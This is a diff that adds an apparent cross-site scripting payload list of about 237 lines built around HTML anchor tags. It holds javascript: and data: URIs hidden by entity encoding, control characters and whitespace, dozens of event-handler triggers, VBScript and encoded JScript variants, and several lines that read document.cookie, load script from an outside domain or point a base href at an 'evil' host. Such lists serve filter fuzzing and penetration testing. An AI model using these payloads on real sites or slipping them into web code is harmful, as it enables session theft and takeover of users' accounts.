@@ -1,0 +1,237 @@
+<a title="&{alert(1)}">XSS</a>
+<a href=javascript:alert(1)>click
+<a href="javascript:alert(1)">XSS</a>
+<a href=" 	javascript:alert(1)">XSS</a>
+<a href="javas	cript:alert(1)">XSS</a>
+<a href="javascript&#x6a;avascript:alert(1)">Firefox</a>
+<a href="javascript&colon;alert(1)">Firefox</a>
+<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="
+<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
+<a onclick="i=createElement('iframe');i.src='javascript:alert(/xss/)';x=parentNode;x.appendChild(i);" href="#">XSS</a>
+<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41">Test</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4=">Test</a>
+<a href="javascript:x=open('http://www.xiaonei.com/');setInterval (function(){try{x.frames[0].location={toString:function(){return%20'http://www.evilsite.com/Project/poc/docshell.html';}}}catch(e){}},3000);void(1);">Test</a>
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:alert(1)>XSS</a>
+<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<a href="javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
+<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
+<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
+<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<a '="foo"><a foo='><img src=x onerror=alert(1)//'>
+“><a href=javascript:prompt(1)>Clickme</a>
+“><a href=”javascript:confirm%28 1%29">Clickme</a>
+“><a href=”data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+”>click</a>
+“><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
+“><a href=javascript:prompt%28 1%29>Clickme</a>
+“><a href=”javascript:co\u006efir\u006d%28 1%29">Clickme</a>
+<a href=# download="filename.html">Test</a>
+<a autofocus onfocus=alert(1) href></a>
+<a autofocus onfocusin=alert(1) href></a>
+<a draggable="true" ondrag="alert(1)">test</a>
+<a draggable="true" ondragend="alert(1)">test</a>
+<a draggable="true" ondragenter="alert(1)">test</a>
+<a draggable="true" ondragleave="alert(1)">test</a>
+<a draggable="true" ondragstart="alert(1)">test</a>
+<a id=x tabindex=1 onactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
+<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<a onafterscriptexecute=alert(1)><script>1</script>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<a onbeforepaste="alert(1)" contenteditable>test</a>
+<a onbeforescriptexecute=alert(1)><script>1</script>
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onclick="alert(1)">test</a>
+<a oncontextmenu="alert(1)">test</a>
+<a oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<a oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<a ondblclick="alert(1)" autofocus tabindex=1>test</a>
+<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onkeydown="alert(1)" contenteditable>test</a>
+<a onkeypress="alert(1)" contenteditable>test</a>
+<a onkeyup="alert(1)" contenteditable>test</a>
+<a onmousedown="alert(1)">test</a>
+<a onmouseenter="alert(1)">test</a>
+<a onmouseleave="alert(1)">test</a>
+<a onmousemove="alert(1)">test</a>
+<a onmouseout="alert(1)">test</a>
+<a onmouseover="alert(1)">test</a>
+<a onmouseup="alert(1)">test</a>
+<a onmousewheel=alert(1)>requires scrolling
+<a onpaste="alert(1)" contenteditable>test</a>
+<a onpointerdown=alert(1)>XSS</a>
+<a onpointerenter=alert(1)>XSS</a>
+<a onpointerleave=alert(1)>XSS</a>
+<a onpointermove=alert(1)>XSS</a>
+<a onpointerout=alert(1)>XSS</a>
+<a onpointerover=alert(1)>XSS</a>
+<a onpointerrawupdate=alert(1)>XSS</a>
+<a href="vbscript:MsgBox+1">XSS</a>
+<a href="#" onclick="vbs:Msgbox+1">XSS</a>
+<a href="#" onclick="VBS:Msgbox+1">XSS</a>
+<a href="#" onclick="vbscript:Msgbox+1">XSS</a>
+<a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a>
+<a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>
+<a href="#" onclick="jscript.compact:alert(1);">test</a>
+<a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>
+<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+<a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+<a onpointerup=alert(1)>XSS</a>
+<a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a>
+<a href="&#0000106avascript:alert(1)">XSS</a>
+<a href="&#x6a;avascript:alert(1)">XSS</a>
+<a href="j&#x61vascript:alert(1)">XSS</a>
+<a href="&#x6a avascript:alert(1)">XSS</a>
+<a href="&#x0000006a;avascript:alert(1)">XSS</a>
+<a href="javascript&colon;alert(1)">XSS</a>
+<a href="java&Tab;script:alert(1)">XSS</a>
+<a href="java&NewLine;script:alert(1)">XSS</a>
+<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
+<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
+<a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a>
+<a href=# onclick="window.open('http://subdomain1.labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>
+<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>
+<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
+<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<a href="jav&#65ascript:javascript:alert(1)">test1</a>
+<a href="jav&#97ascript:javascript:alert(1)">test1</a>
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
+<a2 draggable="true" ondrag="alert(1)">test</a2>
+<a2 draggable="true" ondragend="alert(1)">test</a2>
+<a2 draggable="true" ondragenter="alert(1)">test</a2>
+<a2 draggable="true" ondragleave="alert(1)">test</a2>
+<a2 draggable="true" ondragstart="alert(1)">test</a2>
+<a2 id=x tabindex=1 onactivate=alert(1)></a2>
+<a2 id=x tabindex=1 onbeforeactivate=alert(1)></a2>
+<a2 id=x tabindex=1 onbeforedeactivate=alert(1)></a2><input autofocus>
+<a2 id=x tabindex=1 ondeactivate=alert(1)></a2><input id=y autofocus>
+<a2 onafterscriptexecute=alert(1)><script>1</script>
+<a2 onbeforescriptexecute=alert(1)><script>1</script>
+<a2 onclick="alert(1)">test</a2>
+<a2 oncontextmenu="alert(1)">test</a2>
+<a2 oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<a2 oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<a2 ondblclick="alert(1)" autofocus tabindex=1>test</a2>
+<a2 onkeydown="alert(1)" contenteditable>test</a2>
+<a2 onkeypress="alert(1)" contenteditable>test</a2>
+<a2 onkeyup="alert(1)" contenteditable>test</a2>
+<a2 onmousedown="alert(1)">test</a2>
+<a2 onmouseenter="alert(1)">test</a2>
+<a2 onmouseleave="alert(1)">test</a2>
+<a2 onmousemove="alert(1)">test</a2>
+<a2 onmouseout="alert(1)">test</a2>
+<a2 onmouseover="alert(1)">test</a2>
+<a2 onmouseup="alert(1)">test</a2>
+<a2 onmousewheel=alert(1)>requires scrolling
+<a2 onpointerdown=alert(1)>XSS</a2>
+<a2 onpointerenter=alert(1)>XSS</a2>
+<a2 onpointerleave=alert(1)>XSS</a2>
+<a2 onpointermove=alert(1)>XSS</a2>
+<a2 onpointerout=alert(1)>XSS</a2>
+<a2 onpointerover=alert(1)>XSS</a2>
+<a2 onpointerrawupdate=alert(1)>XSS</a2>
+<a2 onpointerup=alert(1)>XSS</a2>
